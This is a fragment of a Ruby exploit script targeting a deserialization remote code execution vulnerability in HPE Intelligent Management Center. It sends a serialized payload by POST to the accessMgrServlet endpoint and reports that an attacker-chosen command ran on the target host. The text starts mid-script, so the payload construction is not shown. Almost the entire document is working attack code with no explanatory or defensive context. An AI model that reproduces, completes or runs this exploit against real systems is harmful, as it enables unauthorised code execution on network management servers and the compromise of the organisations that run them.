# Hewlett Packard Enterprise Intelligent Management Center 
# accessMgrServlet Deserialization of Untrusted Data  Remote Code Execution Vulnerability

req = sock.request_cgi(
	{
		'uri'   => "/imc/fault/accessMgrServlet",
		'version' => '1.0',
		'method' => 'POST',
		'data' => sploit,
				
	})

	sock.send_request(req)
	data = sock.read_response()

	if data and data.code == 200
		puts "[*] Command '#{cmd}' executed on host '#{host}'"
		File.unlink('payload.serial')
	else
		puts "[!] Error"
		File.unlink('payload.serial')
		exit
	end
rescue => e
	puts "[!] #{e}"
end

